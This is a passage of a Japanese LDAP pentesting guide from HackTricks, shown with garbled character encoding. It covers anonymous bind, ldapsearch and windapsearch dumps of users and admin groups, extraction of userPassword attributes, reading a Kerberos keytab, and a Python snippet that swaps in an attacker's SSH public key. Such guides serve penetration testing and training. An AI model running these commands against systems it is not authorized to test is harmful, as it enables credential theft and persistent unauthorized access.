# 389, 636, 3268, 3269 - LDAPã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ï¼š[**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

**LDAP**ï¼ˆLightweight Directory Access Protocolï¼‰ã®ä½¿ç”¨ã¯ã€ä¸»ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…å¤–ã®çµ„ç¹”ã€å€‹äººã€ãƒ•ã‚¡ã‚¤ãƒ«ã€ãŠã‚ˆã³ãƒ‡ãƒã‚¤ã‚¹ãªã©ã®ã•ã¾ã–ã¾ãªã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«è¡Œã‚ã‚Œã¾ã™ã€‚å‰èº«ã§ã‚ã‚‹DAPã¨æ¯”è¼ƒã—ã¦ã€ã‚³ãƒ¼ãƒ‰ã®ãƒ•ãƒƒãƒˆãƒ—ãƒªãƒ³ãƒˆãŒå°ã•ããªã£ã¦ãŠã‚Šã€åŠ¹ç‡çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

LDAPãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¯ã€å„ã‚µãƒ¼ãƒãƒ¼ãŒãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®**è¤‡è£½ã•ã‚ŒãŸ**ãŠã‚ˆã³**åŒæœŸã•ã‚ŒãŸ**ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä¿æŒã™ã‚‹ã‚ˆã†ã«æ§‹é€ åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯Directory System Agentï¼ˆDSAï¼‰ã¨å‘¼ã°ã‚Œã¾ã™ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†ã¯å®Œå…¨ã«LDAPã‚µãƒ¼ãƒãƒ¼ã«å§”ã­ã‚‰ã‚Œã¦ãŠã‚Šã€å¿…è¦ã«å¿œã˜ã¦ä»–ã®DSAã¨é€šä¿¡ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ã‚¿ãƒ¼ã«çµ±ä¸€ã•ã‚ŒãŸå¿œç­”ã‚’æä¾›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

LDAPãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ§‹é€ ã¯ã€**ãƒˆãƒƒãƒ—ã«ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒã‚ã‚‹ãƒ„ãƒªãƒ¼éšå±¤**ã«ä¼¼ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯å›½ã‹ã‚‰å§‹ã¾ã‚Šã€çµ„ç¹”ã«åˆ†ã‹ã‚Œã€ã•ã‚‰ã«éƒ¨é–€ã‚„éƒ¨é–€ã‚’è¡¨ã™çµ„ç¹”å˜ä½ã«åˆ†ã‹ã‚Œã€æœ€çµ‚çš„ã«ã¯äººã€…ã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ—ãƒªãƒ³ã‚¿ãƒ¼ãªã©ã®å…±æœ‰ãƒªã‚½ãƒ¼ã‚¹ã‚’å«ã‚€å€‹ã€…ã®ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ¬ãƒ™ãƒ«ã«é”ã—ã¾ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:** 389ãŠã‚ˆã³636ï¼ˆldapsï¼‰ã€‚ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚«ã‚¿ãƒ­ã‚°ï¼ˆActiveDirectoryã®LDAPï¼‰ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒãƒ¼ãƒˆ3268ãŠã‚ˆã³3269ã§åˆ©ç”¨å¯èƒ½ã§ã™ã€‚
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAPãƒ‡ãƒ¼ã‚¿äº¤æ›å½¢å¼

LDIFï¼ˆLDAPãƒ‡ãƒ¼ã‚¿äº¤æ›å½¢å¼ï¼‰ã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ¬ã‚³ãƒ¼ãƒ‰ã®ã‚»ãƒƒãƒˆã¨ã—ã¦å®šç¾©ã—ã¾ã™ã€‚ã¾ãŸã€æ›´æ–°ãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼ˆè¿½åŠ ã€å¤‰æ›´ã€å‰Šé™¤ã€åå‰å¤‰æ›´ï¼‰ã‚’è¡¨ã™ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* æœ€åˆã®3è¡Œã¯ãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³localã‚’å®šç¾©ã—ã¦ã„ã¾ã™
* 5-8è¡Œç›®ã¯æœ€åˆã®ãƒ¬ãƒ™ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³moneycorpï¼ˆmoneycorp.localï¼‰ã‚’å®šç¾©ã—ã¦ã„ã¾ã™
* 10-16è¡Œç›®ã¯2ã¤ã®çµ„ç¹”å˜ä½ã€devã¨salesã‚’å®šç¾©ã—ã¦ã„ã¾ã™
* 18-26è¡Œç›®ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã—ã€å€¤ã‚’æŒã¤å±æ€§ã‚’å‰²ã‚Šå½“ã¦ã¦ã„ã¾ã™

## ãƒ‡ãƒ¼ã‚¿ã®æ›¸ãè¾¼ã¿

å€¤ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆã€éå¸¸ã«èˆˆå‘³æ·±ã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã€ŒsshPublicKeyã€æƒ…å ±ã‚’å¤‰æ›´ã§ãã‚‹ã¨æƒ³åƒã—ã¦ãã ã•ã„ã€‚ã“ã®å±æ€§ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€**sshã¯LDAPã‹ã‚‰å…¬é–‹éµã‚’èª­ã¿å–ã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒé«˜ã„**ã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¬é–‹éµã‚’å¤‰æ›´ã§ãã‚Œã°ã€**sshã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰èªè¨¼ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ãªãã¦ã‚‚ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹**ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## å¹³æ–‡ã®è³‡æ ¼æƒ…å ±ã‚’å—…ã

LDAPãŒSSLãªã—ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã§**å¹³æ–‡ã®è³‡æ ¼æƒ…å ±ã‚’å—…ã**ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€LDAPã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®é–“ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§**MITM**æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã“ã§ã€**ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰æ”»æ’ƒ**ã‚’è¡Œã„ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒ**å¹³æ–‡ã®è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨**ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

**SSLãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€å‰è¿°ã®ã‚ˆã†ã«**MITM**ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€**å½ã®è¨¼æ˜æ›¸**ã‚’æä¾›ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã‚Œã‚’å—ã‘å…¥ã‚Œã‚‹**å ´åˆã€èªè¨¼æ–¹æ³•ã‚’ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã—ã¦å†ã³è³‡æ ¼æƒ…å ±ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## åŒ¿åã‚¢ã‚¯ã‚»ã‚¹

### TLS SNIãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

[**ã“ã®è§£èª¬**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ã«ã‚ˆã‚‹ã¨ã€ä»»æ„ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åï¼ˆcompany.comãªã©ï¼‰ã§LDAPã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§ã€åŒ¿åãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦LDAPã‚µãƒ¼ãƒ“ã‚¹ã«é€£çµ¡ã—ã€æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAPåŒ¿åãƒã‚¤ãƒ³ãƒ‰

[LDAPåŒ¿åãƒã‚¤ãƒ³ãƒ‰](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)ã¯ã€**èªè¨¼ã•ã‚Œã¦ã„ãªã„æ”»æ’ƒè€…**ãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå±æ€§ã€ãŠã‚ˆã³ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã®å®Œå…¨ãªãƒªã‚¹ãƒˆãªã©ã€‚ã“ã‚Œã¯**å¤ã„æ§‹æˆ**ã§ã‚ã‚Šã€Windows Server 2003ä»¥é™ã€èªè¨¼ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ãŒLDAPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é–‹å§‹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚\
ãŸã ã—ã€ç®¡ç†è€…ã¯**ç‰¹å®šã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’åŒ¿åãƒã‚¤ãƒ³ãƒ‰ã‚’è¨±å¯ã™ã‚‹ã‚ˆã†ã«è¨­å®š**ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆãŒã‚ã‚Šã€æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚»ã‚¹æ¨©ä»¥ä¸Šã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ä»˜ä¸ã—ã¦ã—ã¾ã„ã€çµæœã¨ã—ã¦èªè¨¼ã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒADå†…ã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

## æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±

LDAPã‚µãƒ¼ãƒãƒ¼ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±ãŒã‚ã‚‹å ´åˆã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³ç®¡ç†è€…ã«é–¢ã™ã‚‹ã™ã¹ã¦ã®æƒ…å ±ã‚’ãƒ€ãƒ³ãƒ—ã§ãã¾ã™ï¼š

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-methodologies-and-resources/brute-force.md#ldap)

## åˆ—æŒ™

### è‡ªå‹•åŒ–

ã“ã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ãƒ‰ãƒ¡ã‚¤ãƒ³åãªã©ã®å…¬é–‹æƒ…å ±**ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Python ã§ LDAP åˆ—æŒ™ã‚’è¦‹ã‚‹</summary>

ã‚ãªãŸã¯ Python ã‚’ä½¿ç”¨ã—ã¦è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã‚‚ã—ãªãã¦ã‚‚ LDAP ã‚’åˆ—æŒ™ã§ãã¾ã™: `pip3 install ldap3`

ã¾ãšã€è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã›ãšã«æ¥ç¶šã—ã¦ã¿ã¦ãã ã•ã„:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
ã‚‚ã—å‰ã®ä¾‹ã®ã‚ˆã†ã«ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ `True` ã§ã‚ã‚Œã°ã€LDAP ã®ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã„ãã¤ã‹ã®**èˆˆå‘³æ·±ã„ãƒ‡ãƒ¼ã‚¿**ï¼ˆä¾‹: **ãƒãƒ¼ãƒŸãƒ³ã‚°ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã‚„**ãƒ‰ãƒ¡ã‚¤ãƒ³å**ï¼‰ã‚’å–å¾—ã§ãã¾ã™:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
ä¸€åº¦å‘½åã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’å–å¾—ã—ãŸã‚‰ã€ã•ã‚‰ã«èˆˆå¥®ã™ã‚‹ã‚¯ã‚¨ãƒªã‚’ä½œæˆã§ãã¾ã™ã€‚ã“ã®å˜ç´”ãªã‚¯ã‚¨ãƒªã§ã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼š
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
ã¾ãŸã¯ã€ldapå…¨ä½“ã‚’**ãƒ€ãƒ³ãƒ—**ã—ã¾ã™ï¼š
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch)ã¯ã€LDAPã‚¯ã‚¨ãƒªã‚’åˆ©ç”¨ã—ã¦Windowsãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ãŠã‚ˆã³ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚’åˆ—æŒ™ã™ã‚‹ã®ã«å½¹ç«‹ã¤Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

ãƒŒãƒ«è³‡æ ¼æƒ…å ±ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã‹ã€è³‡æ ¼æƒ…å ±ãŒæœ‰åŠ¹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
ã‚‚ã—ã€Œ_bind must be completed_ã€ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆã€ãã‚Œã¯è³‡æ ¼æƒ…å ±ãŒé–“é•ã£ã¦ã„ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

**ãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰ã™ã¹ã¦ã‚’æŠ½å‡º**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æŠ½å‡º

LDAPã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

1. **LDAPã‚µãƒ¼ãƒãƒ¼ã¸ã®æ¥ç¶š**:
   LDAPã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦LDAPã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã¾ã™ã€‚

2. **ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã®æ¤œç´¢**:
   é©åˆ‡ãªæ¤œç´¢ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ã€å¿…è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’å–å¾—ã—ã¾ã™ã€‚

3. **æƒ…å ±ã®è§£æ**:
   å–å¾—ã—ãŸæƒ…å ±ã‚’è§£æã—ã€å¿…è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’æŠ½å‡ºã—ã¾ã™ã€‚

4. **çµæœã®åˆ©ç”¨**:
   æŠ½å‡ºã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’åˆ©ç”¨ã—ã¦ã€å¿…è¦ãªæ“ä½œã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
**ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼**ã‚’æŠ½å‡ºã—ã¾ã™ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ç§ã®æƒ…å ±**ã‚’æŠ½å‡ºã—ã¾ã™ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### **Domain Admins**ã®æŠ½å‡º:

```plaintext
ldapsearch -x -h <IP> -b "dc=<domain>,dc=<com>" "(cn=Domain Admins)"
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### **Domain Users**ã®æŠ½å‡º:

```plaintext
ldapsearch -x -h <IP> -b "dc=<domain>,dc=<com>" -D "<username>" -w "<password>" "(objectClass=user)" samaccountname
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Enterprise Admins**ã‚’æŠ½å‡ºã—ã¾ã™:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### Extract **Administrators**:

### ç®¡ç†è€…ã‚’æŠ½å‡ºã™ã‚‹ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### Extract **Remote Desktop Group**:

ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚°ãƒ«ãƒ¼ãƒ—ã‚’æŠ½å‡ºã—ã¾ã™ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚¯ã‚¨ãƒªã®ã„ãšã‚Œã‹ã‚’å®Ÿè¡Œã—ãŸå¾Œã«grepã‚’ä½¿ç”¨ã§ãã¾ã™:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

**pbis**ã¯ã“ã¡ã‚‰ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) é€šå¸¸ã¯`/opt/pbis`ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¾ã™ã€‚\
**Pbis**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€åŸºæœ¬æƒ…å ±ã‚’ç°¡å˜ã«å–å¾—ã§ãã¾ã™:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
